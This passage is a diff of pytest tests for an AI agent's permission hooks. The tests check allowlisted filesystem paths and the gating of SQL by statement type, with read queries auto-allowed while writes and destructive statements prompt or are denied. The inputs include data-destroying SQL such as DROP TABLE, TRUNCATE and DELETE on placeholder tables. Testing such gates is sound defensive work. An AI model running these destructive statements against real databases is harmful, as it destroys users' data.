@@ -5,13 +5,21 @@
 """Tests for the permission hooks module."""
 
 import asyncio
+import json
+from types import SimpleNamespace
 from unittest.mock import AsyncMock, MagicMock
 
 import pytest
 
 from datus.cli.execution_state import InteractionBroker
+from datus.tools.func_tool.semantic_plan_file_tools import SemanticPlanFileTools
 from datus.tools.permission import permission_hooks as permission_hooks_module
-from datus.tools.permission.permission_config import PermissionConfig, PermissionLevel, PermissionRule
+from datus.tools.permission.permission_config import (
+    PermissionConfig,
+    PermissionLevel,
+    PermissionRule,
+    SqlStatementRules,
+)
 from datus.tools.permission.permission_hooks import (
     CompositeHooks,
     FilesystemPolicy,
@@ -19,6 +27,7 @@ from datus.tools.permission.permission_hooks import (
     PermissionHooks,
 )
 from datus.tools.permission.permission_manager import PermissionManager
+from datus.tools.permission.profiles import get_profile
 from datus.tools.registry.tool_registry import ToolRegistry
 
 
@@ -620,7 +629,7 @@ class TestFilesystemZoneBranch:
     path so approval never leaks across targets.
     """
 
-    def _build(self, broker, tmp_path, rules=None, *, strict=False):
+    def _build(self, broker, tmp_path, rules=None, *, strict=False, allowlist=None):
         registry = ToolRegistry()
         fs_tool = MagicMock()
         fs_tool.name = "read_file"
@@ -638,9 +647,65 @@ class TestFilesystemZoneBranch:
             permission_manager=manager,
             node_name="chat",
             tool_registry=registry,
-            fs_policy=FilesystemPolicy(root_path=project, current_node="chat", strict=strict),
+            fs_policy=FilesystemPolicy(
+                root_path=project,
+                current_node="chat",
+                strict=strict,
+                allowlist=allowlist,
+            ),
         )
         return hooks, manager, project
+
+    @pytest.mark.asyncio
+    async def test_allowlisted_root_bypasses_ask(self, mock_broker, tmp_path):
+        """A configured ``allow_write`` root must not prompt.
+
+        The tool classifies it as WHITELIST and writes happily; if the hook
+        still treated it as EXTERNAL, an interactive deployment would prompt on
+        every DAG file and a non-interactive one would raise.
+        """
+        from datus.tools.func_tool.fs_path_policy import PathAllowlist
+
+        dags = tmp_path / "dags"
+        dags.mkdir()
+        (dags / "job.py").write_text("x")
+        hooks, _, _ = self._build(
+            mock_broker,
+            tmp_path,
+            allowlist=PathAllowlist.from_dict({"allow_write": [str(dags)]}),
+        )
+        mock_broker.request = AsyncMock(return_value="n")
+
+        ctx = MagicMock()
+        ctx.tool_arguments = f'{{"path": "{dags / "job.py"}"}}'
+        tool = MagicMock()
+        tool.name = "read_file"
+
+        await hooks.on_tool_start(ctx, MagicMock(), tool)
+        mock_broker.request.assert_not_awaited()
+
+    @pytest.mark.asyncio
+    async def test_path_outside_allowlist_still_asks(self, mock_broker, tmp_path):
+        from datus.tools.func_tool.fs_path_policy import PathAllowlist
+
+        dags = tmp_path / "dags"
+        dags.mkdir()
+        hooks, _, _ = self._build(
+            mock_broker,
+            tmp_path,
+            allowlist=PathAllowlist.from_dict({"allow_write": [str(dags)]}),
+        )
+        mock_broker.request = AsyncMock(return_value="a")
+
+        target = tmp_path / "elsewhere.md"
+        target.write_text("x")
+        ctx = MagicMock()
+        ctx.tool_arguments = f'{{"path": "{target}"}}'
+        tool = MagicMock()
+        tool.name = "read_file"
+
+        await hooks.on_tool_start(ctx, MagicMock(), tool)
+        assert mock_broker.request.await_count == 1
 
     @pytest.mark.asyncio
     async def test_internal_bypasses_ask_rule(self, mock_broker, tmp_path):
@@ -937,7 +1002,7 @@ class TestFilesystemZoneProfileMatrix:
         The zone gate returns ``False`` here so the category-level
         ``default=ASK`` (or any explicit ``filesystem_tools.write_file`` rule)
         takes over. The user choosing "Allow once" lets the call proceed; the
-        cache key is category-level, matching how ``bash_tools.execute_command``
+        cache key is category-level, matching how ``bash_tools.bash``
         ASK works.
         """
         hooks, _, project = self._build(mock_broker, tmp_path, profile="normal")
@@ -967,6 +1032,27 @@ class TestFilesystemZoneProfileMatrix:
         (project / "draft.md").write_text("")
         await hooks.on_tool_start(self._ctx_for("draft.md"), MagicMock(), self._tool("write_file"))
         mock_broker.request.assert_not_called()
+
+    @pytest.mark.parametrize("profile", ["normal", "auto"])
+    @pytest.mark.parametrize("tool_name", ["delete_osi_metrics", "delete_osi_datasets"])
+    @pytest.mark.asyncio
+    async def test_internal_osi_delete_asks_in_non_dangerous_profiles(self, mock_broker, tmp_path, profile, tool_name):
+        hooks, _, project = self._build(
+            mock_broker,
+            tmp_path,
+            profile=profile,
+            registered_tools=(tool_name,),
+        )
+        (project / "metrics.yml").write_text("")
+        mock_broker.request = AsyncMock(return_value="y")
+
+        await hooks.on_tool_start(
+            self._ctx_for("metrics.yml"),
+            MagicMock(),
+            self._tool(tool_name),
+        )
+
+        assert mock_broker.request.await_count == 1
 
     # --------------------------------------------------------------- EXTERNAL
     @pytest.mark.parametrize(
@@ -1032,27 +1118,62 @@ class TestFilesystemZoneProfileMatrix:
     @pytest.mark.asyncio
     async def test_is_write_set_matches_filesystem_tool_surface(self):
         """Guard against drift: the hook's write-set must cover every write
-        method ``FilesystemFuncTool`` actually exposes.
+        method the general or OSI metric filesystem surface actually exposes.
 
         If a new write tool (e.g. ``append_file``) is added without updating
         ``_FILESYSTEM_WRITE_TOOLS``, the normal-profile INTERNAL gate would
         silently regress to bypass for that tool.
         """
         from datus.tools.func_tool.filesystem_tools import FilesystemFuncTool
+        from datus.tools.func_tool.metric_filesystem_tools import (
+            MetricFilesystemFuncTool,
+            OsiSemanticModelFilesystemFuncTool,
+        )
 
         fs_tool = FilesystemFuncTool(root_path="/tmp")
         tool_names = {t.name for t in fs_tool.available_tools()}
+        osi_metric_tool = MetricFilesystemFuncTool(
+            root_path="/tmp",
+            current_node="semantic_modeling",
+        )
+        osi_metric_tool_names = {t.name for t in osi_metric_tool.available_tools()}
+        osi_semantic_tool = OsiSemanticModelFilesystemFuncTool(
+            root_path="/tmp",
+            current_node="semantic_modeling",
+        )
+        osi_semantic_tool_names = {t.name for t in osi_semantic_tool.available_tools()}
         # Every tool the filesystem surface advertises as a mutation must be
         # declared as a write, so the normal-profile INTERNAL gate doesn't
         # silently bypass it. Read-only tools (``read_file`` / ``glob`` /
         # ``grep``) stay out — they have their own gate path.
-        write_names = {"write_file", "edit_file", "delete_file"}
-        # The hook's declared write-set must equal the writes the tool exposes,
+        write_names = {
+            "write_file",
+            "edit_file",
+            "delete_file",
+            "upsert_osi_metrics",
+            "delete_osi_metrics",
+            "upsert_osi_datasets",
+            "delete_osi_datasets",
+        }
+        # The hook's declared write-set must equal the writes these tools expose,
         # not a strict subset. Both directions matter:
         #   - subset breaks the matrix (writes get silently bypassed)
         #   - superset means we ASK on a tool name that doesn't exist
         assert write_names == PermissionHooks._FILESYSTEM_WRITE_TOOLS
-        assert write_names.issubset(tool_names)
+        assert (
+            write_names
+            - {
+                "upsert_osi_metrics",
+                "delete_osi_metrics",
+                "upsert_osi_datasets",
+                "delete_osi_datasets",
+            }
+            <= tool_names
+        )
+        assert "upsert_osi_metrics" in osi_metric_tool_names
+        assert "delete_osi_metrics" in osi_metric_tool_names
+        assert "upsert_osi_datasets" in osi_semantic_tool_names
+        assert "delete_osi_datasets" in osi_semantic_tool_names
 
 
 class TestNonInteractiveMode:
@@ -1575,3 +1696,1601 @@ class TestVisualArtifactAutoAllow:
         )
 
         mock_broker.request.assert_not_called()
+
+
+class TestExecuteSqlPermission:
+    """Statement-type gating for ``db_tools.execute_sql`` via _handle_sql_permission."""
+
+    def _make_hooks(self, mock_broker, config, non_interactive=False, project_root=None):
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "execute_sql"
+        registry.register_tools("db_tools", [tool_mock])
+        manager = PermissionManager(global_config=config)
+        return PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=registry,
+            non_interactive=non_interactive,
+            project_root=project_root,
+        )
+
+    @staticmethod
+    def _ctx(sql):
+        import json
+
+        ctx = MagicMock()
+        ctx.tool_arguments = json.dumps({"sql": sql})
+        return ctx
+
+    @staticmethod
+    def _tool():
+        t = MagicMock()
+        t.name = "execute_sql"
+        return t
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("profile", ["normal", "auto"])
+    @pytest.mark.parametrize("non_interactive", [False, True])
+    async def test_malformed_arguments_defer_to_tool_recovery_without_prompt(
+        self,
+        mock_broker,
+        profile,
+        non_interactive,
+    ):
+        """Malformed calls reach the no-execute recovery path in every default mode."""
+        hooks = self._make_hooks(
+            mock_broker,
+            get_profile(profile),
+            non_interactive=non_interactive,
+        )
+        context = MagicMock()
+        context.tool_arguments = '{"sql":"SELECT 1","min_rows":,"max_rows":}'
+
+        await hooks.on_tool_start(context, MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_read_auto_allows_under_normal_default_ask(self, mock_broker):
+        """A SELECT auto-allows even when the profile default is ASK — no prompt."""
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+
+        await hooks.on_tool_start(self._ctx("SELECT * FROM users"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_metadata_show_auto_allows(self, mock_broker):
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+
+        await hooks.on_tool_start(self._ctx("SHOW TABLES"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_write_prompts_and_allows_on_yes(self, mock_broker):
+        """An INSERT defers to the normal ASK flow; user 'y' lets it through."""
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+        # InteractionBroker.request returns List[List[str]]; mirror that shape.
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("INSERT INTO users VALUES (1)"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_write_rejected_on_no(self, mock_broker):
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+        mock_broker.request = AsyncMock(return_value=[["n"]])
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("DELETE FROM users"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_ddl_prompts(self, mock_broker):
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("CREATE TABLE t (id INT)"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_unknown_or_unparseable_sql_prompts(self, mock_broker):
+        """An unresolvable .sql path / unparseable text is non-read → ASK (fail safe).
+
+        With no ``project_root`` set the ``.sql`` file cannot be read, so the gate
+        keeps the path as-is, classifies it UNKNOWN, and prompts.
+        """
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("sql/session_1/q.sql"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_readonly_sql_file_auto_allows(self, mock_broker, tmp_path):
+        """A .sql file holding a read-only SELECT is resolved and auto-allows.
+
+        The gate reads the workspace-relative file (same logic as the tool) so a
+        read-only file does not trigger an unnecessary confirmation prompt.
+        """
+        sql_dir = tmp_path / "sql"
+        sql_dir.mkdir()
+        (sql_dir / "probe.sql").write_text("SELECT * FROM users LIMIT 10")
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config, project_root=str(tmp_path))
+
+        await hooks.on_tool_start(self._ctx("sql/probe.sql"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_write_sql_file_prompts(self, mock_broker, tmp_path):
+        """A .sql file holding a write is resolved to its real type and prompts."""
+        sql_dir = tmp_path / "sql"
+        sql_dir.mkdir()
+        (sql_dir / "load.sql").write_text("INSERT INTO users VALUES (1)")
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config, project_root=str(tmp_path))
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("sql/load.sql"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_read_respects_explicit_deny(self, mock_broker):
+        """An explicit DENY on execute_sql blocks even a read."""
+        config = PermissionConfig(
+            default_permission=PermissionLevel.ASK,
+            rules=[PermissionRule(tool="db_tools", pattern="execute_sql", permission=PermissionLevel.DENY)],
+        )
+        hooks = self._make_hooks(mock_broker, config)
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("SELECT 1"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_write_non_interactive_raises_without_prompt(self, mock_broker):
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config, non_interactive=True)
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("UPDATE users SET a = 1"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_write_allowed_under_dangerous_default(self, mock_broker):
+        """Dangerous profile (default ALLOW) lets writes through with no prompt."""
+        config = PermissionConfig(default_permission=PermissionLevel.ALLOW, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+
+        await hooks.on_tool_start(self._ctx("INSERT INTO t VALUES (1)"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_session_always_allow_is_bucketed_by_sql_type(self, mock_broker):
+        """'Always allow' is keyed by the concrete SQL type, not a coarse class.
+
+        The session approval is bucketed per type (``execute_sql.insert`` /
+        ``.update`` / ``.ddl``), so approving an INSERT only auto-approves later
+        INSERTs — a different type (UPDATE, DROP) still prompts.
+        """
+        config = PermissionConfig(default_permission=PermissionLevel.ASK, rules=[])
+        hooks = self._make_hooks(mock_broker, config)
+        mock_broker.request = AsyncMock(return_value=[["a"]])  # "always allow (session)"
+
+        # First INSERT: prompts once and approves the ``insert`` bucket.
+        await hooks.on_tool_start(self._ctx("INSERT INTO t VALUES (1)"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+        # Another INSERT (same type): served from the session cache, no prompt.
+        await hooks.on_tool_start(self._ctx("INSERT INTO t VALUES (2)"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+        # An UPDATE (different type) is NOT covered by the insert bucket → prompts.
+        await hooks.on_tool_start(self._ctx("UPDATE t SET a = 1"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 2
+
+        # A DDL (different type again) → prompts once more.
+        await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 3
+
+
+class TestExecuteSqlClassRules:
+    """Statement-class gating for ``execute_sql`` when ``sql_statements`` rules are present."""
+
+    def _make_hooks(
+        self,
+        mock_broker,
+        config,
+        non_interactive=False,
+        project_root=None,
+        project_sql_allows=None,
+        config_mutable=True,
+    ):
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "execute_sql"
+        registry.register_tools("db_tools", [tool_mock])
+        manager = PermissionManager(global_config=config, project_sql_allows=project_sql_allows)
+        return PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=registry,
+            non_interactive=non_interactive,
+            project_root=project_root,
+            config_mutable=config_mutable,
+        )
+
+    @staticmethod
+    def _normal_config(**rule_overrides):
+        return PermissionConfig(
+            default_permission=PermissionLevel.ASK,
+            rules=[],
+            sql_statements=SqlStatementRules(**rule_overrides),
+        )
+
+    @staticmethod
+    def _auto_config():
+        return PermissionConfig(
+            default_permission=PermissionLevel.ASK,
+            rules=[],
+            sql_statements=SqlStatementRules(write=PermissionLevel.ALLOW),
+        )
+
+    @staticmethod
+    def _ctx(sql):
+        import json
+
+        ctx = MagicMock()
+        ctx.tool_arguments = json.dumps({"sql": sql})
+        return ctx
+
+    @staticmethod
+    def _tool():
+        t = MagicMock()
+        t.name = "execute_sql"
+        return t
+
+    @pytest.mark.asyncio
+    async def test_normal_read_auto_allows(self, mock_broker):
+        hooks = self._make_hooks(mock_broker, self._normal_config())
+
+        await hooks.on_tool_start(self._ctx("SELECT * FROM users"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "INSERT INTO t VALUES (1)",
+            "CREATE TABLE t (id INT)",
+            "UPDATE t SET a = 1",
+            "DROP TABLE t",
+        ],
+    )
+    async def test_normal_write_and_destructive_prompt(self, mock_broker, sql):
+        hooks = self._make_hooks(mock_broker, self._normal_config())
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx(sql), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "INSERT INTO t VALUES (1)",
+            "CREATE TABLE t (id INT)",
+            "COMMENT ON TABLE t IS 'x'",
+            "USE analytics",
+        ],
+    )
+    async def test_auto_non_destructive_writes_auto_allow(self, mock_broker, sql):
+        """Under auto's ruleset (write=ALLOW), non-destructive writes never prompt."""
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+
+        await hooks.on_tool_start(self._ctx(sql), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "UPDATE t SET a = 1",
+            "DELETE FROM t",
+            "DROP TABLE t",
+            "TRUNCATE TABLE t",
+            "ALTER TABLE t ADD COLUMN b INT",
+            "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN UPDATE SET a = 1",
+        ],
+    )
+    async def test_auto_destructive_still_prompts(self, mock_broker, sql):
+        """Destructive statements prompt under auto despite write=ALLOW."""
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx(sql), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_auto_unknown_prompts(self, mock_broker):
+        """Unparseable SQL stays ASK under auto (fail safe), despite write=ALLOW."""
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("FROBNICATE THE WIDGETS"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_class_deny_raises_without_prompt(self, mock_broker):
+        hooks = self._make_hooks(mock_broker, self._normal_config(destructive=PermissionLevel.DENY))
+
+        with pytest.raises(PermissionDeniedException, match="sql_statements"):
+            await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_session_bucket_is_per_kind_not_per_class(self, mock_broker):
+        """Approving DROP for the session must not cover TRUNCATE (same class)."""
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+        # Same kind: served from the session cache.
+        await hooks.on_tool_start(self._ctx("DROP TABLE u"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+        # Different kind in the same (destructive) class: prompts again.
+        await hooks.on_tool_start(self._ctx("TRUNCATE TABLE t"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 2
+
+    @pytest.mark.asyncio
+    async def test_project_grant_bypasses_prompt(self, mock_broker):
+        hooks = self._make_hooks(mock_broker, self._auto_config(), project_sql_allows=["drop"])
+
+        await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_project_grant_is_exact_kind(self, mock_broker):
+        """A ``drop`` grant must not cover TRUNCATE (or any other kind)."""
+        hooks = self._make_hooks(mock_broker, self._auto_config(), project_sql_allows=["drop"])
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("TRUNCATE TABLE t"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_project_choice_persists_and_covers_session(self, mock_broker, tmp_path):
+        hooks = self._make_hooks(mock_broker, self._auto_config(), project_root=str(tmp_path))
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+
+        await hooks.on_tool_start(self._ctx("DELETE FROM t"), MagicMock(), self._tool())
+
+        config_file = tmp_path / ".datus" / "config.yml"
+        assert config_file.exists()
+        import yaml
+
+        assert yaml.safe_load(config_file.read_text())["sql_allow"] == ["delete"]
+
+        # Later same-kind calls this session skip the prompt.
+        await hooks.on_tool_start(self._ctx("DELETE FROM u"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_project_choice_not_offered_for_unknown(self, mock_broker):
+        """The prompt for unparseable SQL must not include the project choice."""
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("FROBNICATE THE WIDGETS"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" not in event.choices
+        assert set(event.choices) == {"y", "a", "n"}
+
+    @pytest.mark.asyncio
+    async def test_project_choice_offered_for_destructive(self, mock_broker):
+        """Destructive kinds DO offer the project choice (user decision)."""
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert event.choices["p"] == "Allow 'drop' (project)"
+
+    @pytest.mark.asyncio
+    async def test_project_choice_not_offered_when_config_is_immutable(self, mock_broker):
+        hooks = self._make_hooks(mock_broker, self._auto_config(), config_mutable=False)
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert set(event.choices) == {"y", "a", "n"}
+
+    @pytest.mark.asyncio
+    async def test_rejection_raises(self, mock_broker):
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+        mock_broker.request = AsyncMock(return_value=[["n"]])
+
+        with pytest.raises(PermissionDeniedException, match="User rejected"):
+            await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_non_interactive_destructive_raises_without_prompt(self, mock_broker):
+        hooks = self._make_hooks(mock_broker, self._auto_config(), non_interactive=True)
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("DELETE FROM t"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_non_interactive_auto_write_allowed(self, mock_broker):
+        """Workflow flows under auto rules run non-destructive writes silently."""
+        hooks = self._make_hooks(mock_broker, self._auto_config(), non_interactive=True)
+
+        await hooks.on_tool_start(self._ctx("INSERT INTO t VALUES (1)"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_sql_file_with_drop_prompts_as_destructive(self, mock_broker, tmp_path):
+        """A .sql file is resolved so a DROP inside prompts even under auto."""
+        sql_dir = tmp_path / "sql"
+        sql_dir.mkdir()
+        (sql_dir / "cleanup.sql").write_text("DROP TABLE staging")
+        hooks = self._make_hooks(mock_broker, self._auto_config(), project_root=str(tmp_path))
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("sql/cleanup.sql"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+        event = mock_broker.request.await_args.args[0][0]
+        assert "drop" in event.content
+
+    @pytest.mark.asyncio
+    async def test_explicit_allow_rule_bypasses_class_rules(self, mock_broker):
+        """A user ``db_tools/execute_sql: allow`` rule remains the escape hatch."""
+        config = PermissionConfig(
+            default_permission=PermissionLevel.ASK,
+            rules=[PermissionRule(tool="db_tools", pattern="execute_sql", permission=PermissionLevel.ALLOW)],
+            sql_statements=SqlStatementRules(destructive=PermissionLevel.DENY),
+        )
+        hooks = self._make_hooks(mock_broker, config)
+
+        await hooks.on_tool_start(self._ctx("DROP TABLE t"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_explicit_deny_rule_beats_class_allow(self, mock_broker):
+        """A coarse DENY rule blocks even reads regardless of class rules."""
+        config = PermissionConfig(
+            default_permission=PermissionLevel.ASK,
+            rules=[PermissionRule(tool="db_tools", pattern="execute_sql", permission=PermissionLevel.DENY)],
+            sql_statements=SqlStatementRules(),
+        )
+        hooks = self._make_hooks(mock_broker, config)
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("SELECT 1"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_replace_prompts_as_destructive_under_auto(self, mock_broker):
+        """REPLACE INTO deletes matched rows first — it must not ride write=ALLOW."""
+        hooks = self._make_hooks(mock_broker, self._auto_config())
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("REPLACE INTO t VALUES (1)"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+
+class TestFormatToolArgsMarkdown:
+    """Unit tests for the ``_format_tool_args_markdown`` rendering helper.
+
+    Replaces the old single-line ``json.dumps`` + 200-char truncation: scalars
+    render inline, the ``sql`` arg / long strings move into fenced code blocks,
+    and nested structures render as pretty JSON — never truncated.
+    """
+
+    @staticmethod
+    def _fmt(args):
+        return permission_hooks_module._format_tool_args_markdown(args)
+
+    def test_empty_args_returns_empty_string(self):
+        """Empty args produce no markdown so callers can skip the section."""
+        assert self._fmt({}) == ""
+
+    def test_scalars_render_inline(self):
+        """Short scalars render inline as ``**key:** `value``` with no code fence."""
+        out = self._fmt({"database": "sales", "limit": 10, "dry_run": True, "note": None})
+        assert "**database:** `sales`" in out
+        assert "**limit:** `10`" in out
+        assert "**dry_run:** `True`" in out
+        assert "**note:** `None`" in out
+        assert "```" not in out
+        # Section header is present.
+        assert "**Arguments**" in out
+
+    def test_sql_arg_uses_sql_fence_and_is_not_truncated(self):
+        """The ``sql`` argument lands in a ```sql block with its full text."""
+        long_sql = "INSERT INTO orders (id, amount) VALUES " + ", ".join(f"({i}, {i * 1.5})" for i in range(50))
+        assert len(long_sql) > 200  # would have been truncated by the old code
+        out = self._fmt({"sql": long_sql})
+        assert "```sql" in out
+        assert long_sql in out  # full statement preserved
+        assert "..." not in out  # no truncation marker
+
+    def test_long_non_sql_string_uses_plain_fence(self):
+        """A long/multi-line non-sql string goes into a language-less fence."""
+        text = "line one\nline two\nline three"
+        out = self._fmt({"body": text})
+        assert "**body:**" in out
+        assert "```\n" in out  # language-less fence opener
+        assert "```sql" not in out
+        assert text in out
+
+    def test_nested_value_renders_pretty_json(self):
+        """dict/list values render as multi-line pretty JSON in a ```json block."""
+        nested = {"filters": {"region": {"in": ["us", "eu"]}}, "cols": ["a", "b"]}
+        out = self._fmt(nested)
+        assert "```json" in out
+        # Pretty-printed (indented, multi-line), not a single compact line.
+        assert "\n  " in out
+        # Deeply nested content is preserved.
+        assert '"region"' in out
+        assert '"in"' in out
+
+    def test_short_string_at_threshold_stays_inline(self):
+        """A string at the inline boundary is not forced into a code fence."""
+        value = "x" * permission_hooks_module._INLINE_ARG_MAX
+        out = self._fmt({"k": value})
+        assert f"**k:** `{value}`" in out
+        assert "```" not in out
+
+
+class TestPermissionPromptContent:
+    """End-to-end check that ``_request_user_confirmation`` builds rich content."""
+
+    def _make_hooks(self, mock_broker):
+        manager = PermissionManager(global_config=PermissionConfig())
+        return PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=ToolRegistry(),
+        )
+
+    @staticmethod
+    def _ctx(args):
+        import json
+
+        ctx = MagicMock()
+        ctx.tool_arguments = json.dumps(args)
+        return ctx
+
+    @pytest.mark.asyncio
+    async def test_content_includes_sql_block_without_truncation(self, mock_broker):
+        """The InteractionEvent content carries a full, highlighted SQL block."""
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+        hooks = self._make_hooks(mock_broker)
+        long_sql = "INSERT INTO orders VALUES " + ", ".join(f"({i})" for i in range(60))
+
+        approved = await hooks._request_user_confirmation(
+            "db_tools", "execute_sql.insert", self._ctx({"sql": long_sql})
+        )
+
+        assert approved is True
+        event = mock_broker.request.call_args.args[0][0]
+        assert "```sql" in event.content
+        assert long_sql in event.content  # not truncated
+        assert "..." not in event.content
+
+    @pytest.mark.asyncio
+    async def test_content_has_no_arguments_section_when_args_empty(self, mock_broker):
+        """With no args, the content omits the Arguments section entirely."""
+        mock_broker.request = AsyncMock(return_value=[["n"]])
+        hooks = self._make_hooks(mock_broker)
+
